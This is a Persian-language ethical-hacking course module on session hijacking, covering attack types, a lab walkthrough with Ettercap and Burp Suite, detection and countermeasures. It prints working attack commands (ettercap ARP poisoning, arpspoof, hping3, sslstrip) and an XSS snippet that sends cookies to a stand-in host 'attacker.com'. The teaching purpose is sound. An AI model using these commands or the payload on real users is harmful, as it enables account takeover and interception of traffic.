🔰 مقدمه – Session Hijacking چیست؟

ربودن جلسه (Session Hijacking) یکی از پیشرفته‌ترین و خطرناک‌ترین حملات سایبری است که در آن مهاجم با به سرقت بردن شناسه جلسه (Session ID) یک کاربر معتبر، کنترل جلسه او را به دست می‌گیرد. این حمله معمولاً پس از احراز هویت کاربر انجام می‌شود و مهاجم می‌تواند به جای کاربر، به سیستم دسترسی داشته باشد.

جلسه (Session) به مجموعه‌ای از تعاملات بین یک کاربر و یک سرور در یک بازه زمانی مشخص گفته می‌شود. پس از احراز هویت موفق، سرور یک شناسه جلسه (Session ID) به کاربر اختصاص می‌دهد که در کوکی مرورگر یا URL ذخیره می‌شود. مهاجم با ربودن این شناسه، می‌تواند هویت کاربر را جعل کند.

حملات Session Hijacking معمولاً در لایه‌های مختلف انجام می‌شوند:

  • لایه شبکه (Network Layer): ربودن جلسات TCP/IP.
  • لایه برنامه (Application Layer): ربودن کوکی‌ها، تثبیت جلسه، و حملات MITM.
⚠️ هشدار اخلاقی: Session Hijacking یکی از جدی‌ترین تهدیدات امنیتی است. در هک قانونمند، این تکنیک فقط با مجوز و در محیط‌های کنترل‌شده استفاده می‌شود.

🔑 مفاهیم پایه جلسات (Session Basics)

برای درک Session Hijacking، ابتدا باید با مفاهیم پایه جلسات آشنا شوید:

📌 ۱. Session ID (شناسه جلسه)

  • تعریف: یک رشته منحصربه‌فرد که برای شناسایی یک جلسه خاص استفاده می‌شود.
  • ذخیره‌سازی: معمولاً در کوکی مرورگر، URL (به صورت پارامتر) یا در هدرهای HTTP.
  • اهمیت: اگر مهاجم به Session ID دسترسی پیدا کند، می‌تواند جلسه را ربوده و هویت کاربر را جعل کند.

📌 ۲. Cookie (کوکی)

  • تعریف: یک فایل کوچک متنی که توسط وب‌سایت در مرورگر کاربر ذخیره می‌شود.
  • نقش: ذخیره اطلاعات جلسه، تنظیمات کاربر، و اطلاعات احراز هویت.
  • انواع کوکی: Session Cookie (موقت)، Persistent Cookie (دائمی)، Secure Cookie (با رمزنگاری).

📌 ۳. انواع روش‌های مدیریت جلسه

  • کوکی‌ها (Cookies): رایج‌ترین روش.
  • URL Rewriting: اضافه کردن Session ID به URL.
  • Hidden Form Fields: ذخیره Session ID در فیلدهای مخفی فرم‌ها.
  • HTTP Headers: استفاده از هدرهای سفارشی برای انتقال Session ID.
💡 نکته: کوکی‌ها امن‌ترین روش مدیریت جلسه نیستند، به خصوص اگر تنظیمات امنیتی (مانند Secure و HttpOnly) روی آنها اعمال نشده باشد.

📌 انواع حملات Session Hijacking

حملات Session Hijacking بر اساس نحوه اجرا و لایه هدف به دو دسته کلی تقسیم می‌شوند:

🔍 ۱. حملات غیرفعال (Passive Hijacking)

  • تعریف: مهاجم فقط جلسه را شنود می‌کند و هیچ بسته‌ای ارسال نمی‌کند.
  • روش: Sniffing ترافیک شبکه برای دریافت Session ID.
  • مزایا: مخفیانه و بدون ردپا.
  • معایب: فقط در شبکه‌های غیرامن (مثل HTTP) کار می‌کند.

📡 ۲. حملات فعال (Active Hijacking)

  • تعریف: مهاجم با ارسال بسته‌های خاص، جلسه را ربوده و کنترل آن را به دست می‌گیرد.
  • روش: جعل بسته‌ها، تزریق کد، حملات MITM، Session Fixation.
  • مزایا: در شبکه‌های مدرن (با رمزنگاری) قابل اجرا است.
  • معایب: قابل تشخیص و ممکن است باعث اختلال در جلسه شود.

📌 ۳. بر اساس لایه

  • TCP Session Hijacking: ربودن جلسات TCP با جعل بسته‌ها و تزریق کد.
  • UDP Session Hijacking: ربودن جلسات UDP با جعل بسته‌ها.
  • HTTP Session Hijacking: ربودن جلسات وب با استفاده از کوکی‌ها یا URL.
💡 نکته: حملات فعال بسیار خطرناک‌تر هستند و می‌توانند در شبکه‌های مدرن نیز اجرا شوند.

🔄 مراحل یک حمله Session Hijacking

یک حمله Session Hijacking معمولاً از مراحل زیر تشکیل می‌شود:

  1. شناسایی هدف (Target Identification): شناسایی یک کاربر معتبر و در حال استفاده از سرویس هدف.
  2. شنود جلسه (Session Sniffing): جمع‌آوری اطلاعات جلسه مانند Session ID, Cookie, و شماره دنباله TCP.
  3. جعل هویت (Impersonation): استفاده از اطلاعات جمع‌آوری شده برای جعل هویت کاربر.
  4. ربودن جلسه (Session Hijacking): قطع اتصال کاربر واقعی و ادامه جلسه با هویت جعلی.
  5. بهره‌برداری (Exploitation): استفاده از دسترسی به دست آمده برای انجام اقدامات مخرب.
💡 نکته: موفقیت این حمله به شدت به کیفیت مرحله شنود و جمع‌آوری اطلاعات بستگی دارد.

🔴 TCP Session Hijacking

TCP Session Hijacking یکی از قدیمی‌ترین و معروف‌ترین تکنیک‌های Session Hijacking است که در آن مهاجم با جعل بسته‌های TCP، کنترل یک جلسه TCP فعال را به دست می‌گیرد.

📌 نحوه عملکرد:

  1. مهاجم با استفاده از Sniffing، اطلاعات جلسه TCP (شماره دنباله، شماره تأیید، پورت‌ها) را جمع‌آوری می‌کند.
  2. مهاجم یک بسته TCP جعلی به سرور ارسال می‌کند که به نظر می‌رسد از طرف کاربر معتبر ارسال شده است.
  3. سرور با دریافت بسته جعلی، آن را به عنوان بخشی از جلسه فعلی پردازش می‌کند.
  4. مهاجم با ارسال بسته RST به کاربر واقعی، اتصال او را قطع می‌کند.
  5. مهاجم کنترل کامل جلسه را به دست می‌گیرد.

📌 ابزارهای TCP Session Hijacking:

  • Ettercap: ابزار قدرتمند برای MITM و Session Hijacking.
  • Hunt: ابزار تخصصی برای TCP Session Hijacking.
  • Juggernaut: ابزار قدیمی اما مؤثر برای این کار.
# استفاده از Ettercap برای TCP Session Hijacking
ettercap -T -M arp:remote // // -P tcp_hijack

# استفاده از Hunt برای ربودن جلسه
hunt -i eth0
⚠️ هشدار: TCP Session Hijacking در شبکه‌های امروزی با استفاده از رمزنگاری (SSL/TLS) دشوارتر شده است، اما همچنان در شبکه‌های غیرامن یک تهدید جدی است.

🔵 UDP Session Hijacking

UDP Session Hijacking مشابه TCP Session Hijacking است اما با این تفاوت که UDP بدون اتصال است و مکانیزم تأیید ندارد. این ویژگی UDP را نسبت به TCP آسیب‌پذیرتر می‌کند.

📌 نحوه عملکرد:

  • مهاجم با استفاده از Sniffing، اطلاعات جلسه UDP (پورت‌ها و محتوا) را جمع‌آوری می‌کند.
  • مهاجم یک بسته UDP جعلی به سرور ارسال می‌کند که به نظر می‌رسد از طرف کاربر معتبر ارسال شده است.
  • از آنجا که UDP بدون اتصال است و شماره دنباله ندارد، سرور نمی‌تواند بسته جعلی را از بسته واقعی تشخیص دهد.
  • مهاجم می‌تواند داده‌های جعلی را به سرور ارسال کند یا پاسخ‌های سرور را شنود کند.

📌 پروتکل‌های آسیب‌پذیر UDP:

  • DNS: حملات DNS Spoofing.
  • SNMP: تغییر تنظیمات شبکه.
  • NTP: حملات بازتابی و تقویتی.
  • DHCP: حملات DHCP Spoofing.
💡 نکته: UDP به دلیل عدم وجود مکانیزم تأیید، یکی از آسیب‌پذیرترین پروتکل‌ها برای Session Hijacking است.

🟢 HTTP Session Hijacking

HTTP Session Hijacking رایج‌ترین نوع Session Hijacking است که در آن مهاجم با ربودن کوکی جلسه یا Session ID، کنترل جلسه وب کاربر را به دست می‌گیرد.

📌 روش‌های HTTP Session Hijacking:

  • سرقت کوکی (Cookie Theft): از طریق Sniffing، XSS، یا مهندسی اجتماعی.
  • تثبیت جلسه (Session Fixation): تعیین Session ID از قبل برای کاربر.
  • Cross-Site Scripting (XSS): تزریق کد جاوااسکریپت برای دزدیدن کوکی.
  • Man-in-the-Middle (MITM): شنود و تغییر ترافیک HTTP.

📌 ابزارهای HTTP Session Hijacking:

  • Burp Suite: برای دستکاری کوکی‌ها و جلسات.
  • OWASP ZAP: ابزار تست امنیت وب.
  • Firefox Developer Tools: بررسی و دستکاری کوکی‌ها.
# استفاده از Burp Suite برای دستکاری کوکی
# ۱. تنظیم Proxy در Burp
# ۲. ضبط درخواست HTTP
# ۳. تغییر مقدار Cookie در بخش Parameters
# ۴. ارسال درخواست تغییر یافته به سرور
⚠️ هشدار: HTTP Session Hijacking به ویژه در وب‌سایت‌هایی که از HTTPS استفاده نمی‌کنند، بسیار رایج است.

🎯 تکنیک‌های Spoofing در Session Hijacking

Spoofing یکی از تکنیک‌های کلیدی در Session Hijacking است که در آن مهاجم آدرس IP، MAC، یا شناسه جلسه خود را جعل می‌کند.

📌 انواع Spoofing:

  • IP Spoofing: جعل آدرس IP مبدأ برای فریب سیستم‌ها.
  • MAC Spoofing: جعل آدرس MAC برای دور زدن کنترل‌های دسترسی.
  • ARP Spoofing: جعل جدول ARP برای هدایت ترافیک به مهاجم (MITM).
  • DNS Spoofing: جعل پاسخ‌های DNS برای هدایت کاربران به وب‌سایت‌های جعلی.
  • Cookie Spoofing: جعل کوکی جلسه برای ربودن جلسه.
# ARP Spoofing با arpspoof
arpspoof -i eth0 -t 192.168.1.101 192.168.1.1

# IP Spoofing با hping3
hping3 -S -p 80 -a 192.168.1.102 192.168.1.101
💡 نکته: Spoofing معمولاً اولین گام برای اجرای حملات Session Hijacking است.

🔐 تثبیت جلسه (Session Fixation)

Session Fixation یک تکنیک پیشرفته در Session Hijacking است که در آن مهاجم یک Session ID از پیش تعیین‌شده را به کاربر تحمیل می‌کند و پس از احراز هویت کاربر، از همان Session ID برای ربودن جلسه استفاده می‌کند.

📌 مراحل حمله Session Fixation:

  1. مهاجم یک Session ID معتبر از سرور دریافت می‌کند (مثلاً با بازدید از وب‌سایت).
  2. مهاجم کاربر را فریب می‌دهد تا با همان Session ID وارد سیستم شود (از طریق لینک، ایمیل، یا XSS).
  3. کاربر با Session ID تعیین‌شده توسط مهاجم وارد سیستم می‌شود.
  4. مهاجم با استفاده از همان Session ID به جلسه کاربر دسترسی پیدا می‌کند.

📌 مثال‌های Session Fixation:

  • ارسال لینک با Session ID در URL: https://example.com/login?sessionid=12345
  • استفاده از XSS برای تنظیم کوکی Session ID.
  • استفاده از مهندسی اجتماعی برای فریب کاربر به کلیک روی لینک.
⚠️ هشدار: Session Fixation یکی از خطرناک‌ترین تکنیک‌های Session Hijacking است و بسیاری از وب‌سایت‌ها هنوز در برابر آن آسیب‌پذیرند.

🍪 ربودن کوکی (Cookie Hijacking)

Cookie Hijacking یکی از رایج‌ترین روش‌های HTTP Session Hijacking است که در آن مهاجم با سرقت کوکی جلسه کاربر، کنترل جلسه را به دست می‌گیرد.

📌 روش‌های ربودن کوکی:

  • Sniffing: شنود ترافیک HTTP برای دریافت کوکی.
  • XSS (Cross-Site Scripting): تزریق کد جاوااسکریپت برای خواندن کوکی.
  • Cross-Site Request Forgery (CSRF): استفاده از کوکی برای انجام اقدامات غیرمجاز.
  • Session Fixation: تحمیل یک کوکی خاص به کاربر.
  • مهندسی اجتماعی: فریب کاربر برای افشای کوکی.

📌 مثال XSS برای ربودن کوکی:

<script>
    fetch('http://attacker.com/steal?cookie=' + document.cookie);
</script>
💡 نکته: استفاده از تنظیمات HttpOnly و Secure در کوکی‌ها می‌تواند از ربودن کوکی جلوگیری کند.

👤 حملات Man-in-the-Middle (MITM) در Session Hijacking

حملات MITM یکی از مؤثرترین روش‌ها برای Session Hijacking هستند که در آنها مهاجم بین کاربر و سرور قرار می‌گیرد و ترافیک را شنود، تغییر یا مسدود می‌کند.

📌 انواع حملات MITM در Session Hijacking:

  • SSL Stripping: کاهش امنیت HTTPS به HTTP.
  • ARP Spoofing: هدایت ترافیک به مهاجم.
  • DNS Spoofing: هدایت کاربران به وب‌سایت‌های جعلی.
  • Session Hijacking: ربودن جلسه با استفاده از اطلاعات شنود شده.
# استفاده از ettercap برای MITM
ettercap -T -M arp:remote /192.168.1.101// /192.168.1.1//

# استفاده از sslstrip برای SSL Stripping
sslstrip -l 8080
⚠️ هشدار: حملات MITM یکی از خطرناک‌ترین تهدیدات امنیتی هستند و می‌توانند اطلاعات بسیار حساسی را به سرقت ببرند.

🛠️ ابزارهای Session Hijacking

ابزارهای متعددی برای اجرای Session Hijacking وجود دارند که در این بخش مهم‌ترین آنها را معرفی می‌کنیم:

ابزارنوع حملهتوضیح
Ettercap MITM, ARP Spoofing, TCP Hijacking ابزار قدرتمند برای حملات MITM و Session Hijacking
Burp Suite HTTP Session Hijacking دستکاری کوکی‌ها و جلسات وب
OWASP ZAP HTTP Session Hijacking ابزار تست امنیت وب با قابلیت دستکاری جلسات
Hunt TCP Session Hijacking ابزار تخصصی برای ربودن جلسات TCP
Juggernaut TCP Session Hijacking ابزار قدیمی اما مؤثر برای TCP Hijacking
Cookie Cadger Cookie Hijacking شنود و ربودن کوکی‌ها از ترافیک HTTP
Hamster Cookie Hijacking ابزار گرافیکی برای ربودن کوکی‌ها
Ferret Cookie Hijacking شنود و استخراج کوکی‌ها از ترافیک
BetterCAP MITM, ARP Spoofing نسخه مدرن Ettercap با قابلیت‌های بیشتر
💡 نکته: Burp Suite و Ettercap دو تا از محبوب‌ترین ابزارهای Session Hijacking هستند.

🔍 تشخیص Session Hijacking

تشخیص به‌موقع حملات Session Hijacking می‌تواند از خسارت‌های بزرگ جلوگیری کند. در ادامه، روش‌های تشخیص این حملات را معرفی می‌کنیم:

📌 نشانه‌های یک حمله Session Hijacking:

  • تغییرات غیرعادی در رفتار کاربر (مثل درخواست‌های غیرمعمول).
  • ورود همزمان از دو مکان مختلف با یک حساب کاربری.
  • انصراف ناگهانی از جلسه (Session Timeout).
  • تغییر تنظیمات حساب کاربری بدون اطلاع کاربر.
  • درخواست‌های HTTP با Session IDهای تکراری یا غیرعادی.

📌 ابزارهای تشخیص Session Hijacking:

  • IDS/IPS: مانند Snort و Suricata.
  • SIEM: تحلیل لاگ‌ها و تشخیص ناهنجاری‌ها.
  • Wireshark: تحلیل ترافیک شبکه برای یافتن بسته‌های مشکوک.
  • راه‌حل‌های امنیتی وب: مانند WAF (Web Application Firewall).
# استفاده از Snort برای تشخیص ARP Spoofing
snort -i eth0 -c /etc/snort/snort.conf -A console

# بررسی لاگ‌های سرور برای Session IDهای مشکوک
grep "sessionid" /var/log/apache2/access.log
💡 نکته: ترکیب چند روش تشخیص، دقت را به شدت افزایش می‌دهد.

🛡️ راه‌های مقابله با Session Hijacking (Countermeasures)

برای جلوگیری از حملات Session Hijacking، سازمان‌ها و توسعه‌دهندگان باید اقدامات زیر را انجام دهند:

📌 اقدامات کلی:

  • استفاده از HTTPS: رمزنگاری تمام ارتباطات وب.
  • تنظیمات امن کوکی:
    • Secure Flag: کوکی فقط از طریق HTTPS ارسال شود.
    • HttpOnly Flag: کوکی از طریق جاوااسکریپت قابل دسترسی نباشد.
    • SameSite Flag: جلوگیری از ارسال کوکی در درخواست‌های Cross-Site.
  • استفاده از Session IDهای قوی: تولید Session IDهای طولانی، تصادفی و غیرقابل پیش‌بینی.
  • تنظیم Timeout برای جلسات: پایان دادن خودکار به جلسات پس از مدت زمان مشخص.
  • تغییر Session ID پس از احراز هویت: ایجاد Session ID جدید پس از ورود موفق.
  • استفاده از احراز هویت چندعاملی (MFA): اضافه کردن لایه‌های امنیتی بیشتر.
  • آموزش کاربران: آگاهی‌بخشی درباره خطرات کلیک روی لینک‌های ناشناس.

📌 اقدامات خاص برای هر نوع حمله:

  • در برابر TCP Hijacking: استفاده از IPsec یا رمزنگاری لایه شبکه.
  • در برابر Session Fixation: تغییر Session ID پس از ورود، عدم پذیرش Session ID از URL.
  • در برابر XSS: فیلتر کردن ورودی‌ها، استفاده از Content Security Policy (CSP).
  • در برابر MITM: استفاده از HTTPS با گواهی‌های معتبر، استفاده از HSTS.
  • در برابر Sniffing: استفاده از شبکه‌های امن (VPN).
💡 نکته: بهترین دفاع در برابر Session Hijacking، ترکیبی از رمزنگاری، تنظیمات امن کوکی و آموزش کاربران است.

🤖 Session Hijacking با هوش مصنوعی

CEH v13 به عنوان اولین نسخه‌ای که هوش مصنوعی را در تمام مراحل هک قانونمند ادغام کرده، به نقش هوش مصنوعی در Session Hijacking نیز می‌پردازد.

📌 نقش هوش مصنوعی در Session Hijacking:

  • تشخیص خودکار حملات: AI می‌تواند الگوهای غیرعادی در رفتار کاربران را شناسایی کند.
  • پیش‌بینی حملات: AI می‌تواند حملات Session Hijacking را قبل از وقوع پیش‌بینی کند.
  • کاهش مثبت کاذب: AI می‌تواند هشدارهای اشتباه را کاهش دهد.
  • تحلیل رفتار کاربر: AI می‌تواند رفتار عادی کاربر را یاد بگیرد و انحرافات را شناسایی کند.
  • واکنش خودکار: AI می‌تواند به‌صورت خودکار جلسات مشکوک را قطع کند.

📌 ابزارهای AI-Powered Session Detection:

  • AI-Based IDS/IPS: سیستم‌های تشخیص نفوذ مبتنی بر AI.
  • AI-Powered Behavioral Analysis: تحلیل رفتار کاربر با استفاده از AI.
  • AI-Driven Anomaly Detection: تشخیص ناهنجاری‌های جلسات با AI.
💡 چرا هوش مصنوعی در Session Hijacking مهم است؟

هوش مصنوعی می‌تواند حملات Session Hijacking را با دقت بالا و در زمان واقعی تشخیص دهد و از دسترسی غیرمجاز جلوگیری کند.

🧪 کارگاه عملی – Session Hijacking

در این کارگاه، شما با تکنیک‌ها و ابزارهای Session Hijacking آشنا خواهید شد و یک سناریوی کامل از ربودن جلسه را در محیط آزمایشگاهی پیاده‌سازی می‌کنید.

🎯 هدف کارگاه:

  • آشنایی با ابزارهای Session Hijacking مانند Ettercap و Burp Suite.
  • اجرای ARP Spoofing برای MITM.
  • ربودن یک جلسه HTTP با استفاده از کوکی.
  • تشخیص و مقابله با Session Hijacking.

🖥️ محیط مورد نیاز:

  • حمله‌کننده: Kali Linux
  • هدف: یک وب‌سرور آزمایشگاهی (مثل Metasploitable 2 با یک برنامه وب ساده)
  • کلاینت: یک مرورگر (Firefox/Chrome) روی یک سیستم ویندوز یا لینوکس
  • ابزارها: Ettercap, Wireshark, Burp Suite, Firefox Developer Tools

📝 سناریوی گام‌به‌گام:

مرحله ۱: راه‌اندازی وب‌سرور و کاربر

# روی سیستم هدف (Metasploitable 2)
sudo service apache2 start

# کاربر با مرورگر به وب‌سایت متصل می‌شود (مثلاً http://192.168.1.101)

تحلیل: کاربر وارد وب‌سایت می‌شود و یک کوکی جلسه دریافت می‌کند.

مرحله ۲: اجرای ARP Spoofing با Ettercap

# از Kali Linux
ettercap -T -M arp:remote /192.168.1.101// /192.168.1.1//

تحلیل: ترافیک بین کاربر و سرور به مهاجم هدایت می‌شود.

مرحله ۳: شنود کوکی با Wireshark

# در Wireshark، فیلتر http.cookie را اعمال کنید
# کوکی جلسه را در درخواست‌های HTTP پیدا کنید

تحلیل: کوکی جلسه کاربر در ترافیک HTTP قابل مشاهده است.

مرحله ۴: ربودن جلسه با استفاده از کوکی

# در Burp Suite یا Firefox Developer Tools
# ۱. کوکی شناسایی شده را کپی کنید
# ۲. در مرورگر مهاجم، کوکی را تنظیم کنید
# ۳. به وب‌سایت متصل شوید و جلسه کاربر را ربوده کنید

تحلیل: مهاجم با استفاده از کوکی، به حساب کاربر دسترسی پیدا می‌کند.

مرحله ۵: تشخیص و مقابله

# روی سرور، تنظیمات امن کوکی را اعمال کنید
# HttpOnly, Secure, SameSite
# تغییر Session ID پس از ورود

تحلیل: با اعمال تنظیمات امن، حمله خنثی می‌شود.

⏳ تکلیف: تمام مراحل بالا را در محیط آزمایشگاهی خود اجرا کنید و یک گزارش کامل از فرآیند حمله، تشخیص و مقابله تهیه کنید.

📝 تمرین‌های عملی

این تمرینات به شما کمک می‌کنند تا مهارت‌های خود در زمینه Session Hijacking را تقویت کنید.

  • تمرین ۱ – ARP Spoofing:
    با استفاده از Ettercap، یک حمله ARP Spoofing روی یک شبکه آزمایشگاهی اجرا کنید و ترافیک را با Wireshark تحلیل کنید.
  • تمرین ۲ – ربودن کوکی:
    با استفاده از Wireshark، یک کوکی جلسه HTTP را از ترافیک استخراج کنید و با Burp Suite آن را دستکاری کنید.
  • تمرین ۳ – Session Fixation:
    یک سناریوی Session Fixation طراحی کنید و روی یک برنامه وب آزمایشگاهی پیاده‌سازی کنید.
  • تمرین ۴ – تشخیص Session Hijacking:
    با استفاده از Snort یا Wireshark، یک حمله Session Hijacking را تشخیص دهید.
  • تمرین ۵ – مقابله با Session Hijacking:
    تنظیمات امن کوکی (HttpOnly, Secure, SameSite) را روی یک وب‌سرور پیاده‌سازی کنید و تأثیر آن را آزمایش کنید.

📖 واژه‌نامه تخصصی (Glossary)

در این بخش، تمام واژه‌های تخصصی این ماژول، همراه با ساختار (ریشه یا مخفف)، تعریف ساده، کاربرد در هک، و یک مثال روزمره توضیح داده شده است.

واژه ساختار / مخفف تعریف ساده کاربرد در هک مثال
Session Hijacking — ربودن جلسه کاربر معتبر. دسترسی غیرمجاز به حساب کاربری. ربودن کوکی جلسه یک کاربر.
Session ID — شناسه منحصربه‌فرد برای یک جلسه. شناسایی جلسه کاربر. Session ID در کوکی مرورگر.
Cookie Hijacking — ربودن کوکی جلسه کاربر. دسترسی به جلسه کاربر. سرقت کوکی با XSS.
Session Fixation — تحمیل Session ID به کاربر. ربودن جلسه با Session ID از پیش تعیین‌شده. ارسال لینک با Session ID در URL.
ARP Spoofing — جعل جدول ARP برای هدایت ترافیک. اجرای حملات MITM و Session Hijacking. ettercap -T -M arp:remote
MITM Man-in-the-Middle حمله مرد میانی. شنود و تغییر ترافیک بین دو طرف. SSL Stripping.
XSS Cross-Site Scripting تزریق کد جاوااسکریپت به وب‌سایت. سرقت کوکی، دستکاری جلسات. <script>alert(document.cookie)</script>
HttpOnly — تنظیم کوکی برای عدم دسترسی از طریق جاوااسکریپت. جلوگیری از سرقت کوکی با XSS. Set-Cookie: ...; HttpOnly
Secure Flag — تنظیم کوکی برای ارسال فقط از طریق HTTPS. جلوگیری از Sniffing کوکی. Set-Cookie: ...; Secure
SameSite — تنظیم کوکی برای جلوگیری از ارسال در درخواست‌های Cross-Site. جلوگیری از CSRF. Set-Cookie: ...; SameSite=Strict
Ettercap — ابزار قدرتمند برای MITM و Session Hijacking. ARP Spoofing, TCP Hijacking. ettercap -T -M arp:remote
Burp Suite — ابزار تست امنیت وب. دستکاری کوکی‌ها و جلسات. دستکاری درخواست‌های HTTP.
Hunt — ابزار TCP Session Hijacking. ربودن جلسات TCP. hunt -i eth0
